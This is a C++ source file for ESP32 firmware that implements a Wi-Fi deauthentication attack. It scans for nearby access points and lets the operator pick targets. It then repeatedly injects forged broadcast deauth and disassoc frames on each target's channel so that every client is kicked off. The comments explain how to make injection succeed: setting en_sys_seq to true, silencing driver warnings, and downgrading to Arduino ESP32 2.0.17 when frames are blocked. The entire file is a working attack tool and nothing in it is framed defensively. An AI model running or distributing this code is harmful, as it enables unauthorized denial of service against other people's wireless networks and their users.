/**
 * deauth_attack.cpp
 *
 * CRITICAL: esp_wifi_80211_tx last arg = en_sys_seq
 * From ESP-IDF docs: "if called after WiFi connection is set up,
 * en_sys_seq MUST be true, otherwise ESP_ERR_WIFI_ARG is returned"
 * Since our softAP is always running, this must ALWAYS be true.
 * Using false = silent failure, frame never transmitted.
 */
#include "deauth_attack.h"
#include "cyber_storage.h"
#include <esp_wifi.h>

// Marauder exact deauth frame
// 0xc0 0x00 = deauth management
// 0x3a 0x01 = duration (Marauder value)
// ff:ff:ff:ff:ff:ff = broadcast dest (kicks all clients)
// bytes 10-15 = AP BSSID (source) — filled per target
// bytes 16-21 = BSSID — filled per target
// 0xf0 0xff = sequence (Marauder value)
// 0x02 0x00 = reason: prev auth no longer valid
static uint8_t deauthFrame[26] = {
  0xC0, 0x00,
  0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF,
  0x02, 0x00
};

// Marauder exact disassoc frame (same structure, FC=0xA0)
static uint8_t disassocFrame[26] = {
  0xA0, 0x00,
  0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF,
  0x08, 0x00
};

void DeauthAttack::begin() {
  _running=false; _count=0; _deauthCount=0; _scanJustDone=false;
}

void DeauthAttack::_parseBSSID(const String& s, uint8_t* out) {
  for(int i=0;i<6;i++)
    out[i]=(uint8_t)strtol(s.substring(i*3,i*3+2).c_str(),nullptr,16);
}

void DeauthAttack::scanStart() {
  _count=0; _scanning=true; _scanJustDone=false;
  WiFi.scanNetworks(true,true);
  Serial.println("Deauth: async scan started");
}
void DeauthAttack::scan() { scanStart(); }

void DeauthAttack::select(int i,bool on){ if(i>=0&&i<_count) _targets[i].selected=on; }
void DeauthAttack::selectAll(){ for(int i=0;i<_count;i++) _targets[i].selected=true; }
void DeauthAttack::clearSelection(){ for(int i=0;i<_count;i++) _targets[i].selected=false; }

void DeauthAttack::startSelected(){
  _running=true; _deauthCount=0; _currentTarget=0;
  Serial.println("Deauth: running");
}
void DeauthAttack::startAll(){ selectAll(); startSelected(); }
void DeauthAttack::startSingle(int i){ clearSelection(); select(i,true); startSelected(); }
void DeauthAttack::stop(){ _running=false; Serial.printf("Deauth: stopped. Sent=%d\n",_deauthCount); }

void DeauthAttack::_sendDeauth(uint8_t* bssid, int channel) {
  // Silence the "unsupport frame type" log spam from the WiFi driver.
  // In Arduino ESP32 3.x (IDF 5.x) the driver logs an error for deauth/disassoc
  // frame types but still attempts to send them. Suppress to keep serial readable.
  esp_log_level_set("wifi", ESP_LOG_NONE);

  // Switch to target channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delayMicroseconds(500);

  // Fill BSSID into source and BSSID fields
  memcpy(&deauthFrame[10],  bssid, 6);
  memcpy(&deauthFrame[16],  bssid, 6);
  memcpy(&disassocFrame[10],bssid, 6);
  memcpy(&disassocFrame[16],bssid, 6);

  // en_sys_seq=TRUE — mandatory when softAP is running
  // Without this the driver returns ESP_ERR_WIFI_ARG and sends nothing
  esp_err_t r1,r2;
  for(int i=0;i<5;i++){
    r1=esp_wifi_80211_tx(WIFI_IF_AP,  deauthFrame,   sizeof(deauthFrame),   true);
    r2=esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame,   sizeof(deauthFrame),   true);
  }
  for(int i=0;i<5;i++){
    esp_wifi_80211_tx(WIFI_IF_AP,  disassocFrame, sizeof(disassocFrame), true);
    esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), true);
  }
  // Restore WiFi log level
  esp_log_level_set("wifi", ESP_LOG_ERROR);

  // Log result once every 2s so we can confirm frames are injecting
  static uint32_t lastLog=0;
  if(millis()-lastLog>2000){
    lastLog=millis();
    Serial.printf("Deauth TX: AP=%s STA=%s ch=%d target=%02x:%02x:%02x:%02x:%02x:%02x\n",
      r1==0?"OK":"FAIL", r2==0?"OK":"FAIL",
      channel,bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
    if(r1!=0||r2!=0)
      Serial.println("Deauth: TX failed — Arduino ESP32 3.x blocks deauth/disassoc");
    if(r1!=0||r2!=0)
      Serial.println("Deauth: Downgrade to Arduino ESP32 2.0.17 to fix this");
  }
}

void DeauthAttack::tick() {
  // Collect async scan results
  if(_scanning){
    int n=WiFi.scanComplete();
    if(n==WIFI_SCAN_RUNNING) return;
    if(n>=0){
      _count=0;
      for(int i=0;i<n&&_count<MAX_DEAUTH_TARGETS;i++){
        _targets[_count].ssid    = WiFi.SSID(i);
        _targets[_count].bssid   = WiFi.BSSIDstr(i);
        _targets[_count].channel = WiFi.channel(i);
        _targets[_count].rssi    = WiFi.RSSI(i);
        _targets[_count].selected= false;
        memcpy(_targets[_count].bssidBytes, WiFi.BSSID(i), 6);
        _count++;
      }
      WiFi.scanDelete();
      _scanJustDone=true;
      Serial.printf("Deauth: scan done, found %d networks\n",_count);
    }
    _scanning=false;
    return;
  }

  if(!_running) return;
  if(millis()-_lastSend < 50) return;
  _lastSend=millis();

  // Find next selected target
  int tried=0;
  while(tried < _count){
    if(_currentTarget >= _count) _currentTarget=0;
    if(_targets[_currentTarget].selected){
      _sendDeauth(_targets[_currentTarget].bssidBytes,
                  _targets[_currentTarget].channel);
      _deauthCount++;
      _currentTarget++;
      return;
    }
    _currentTarget++;
    tried++;
  }
}
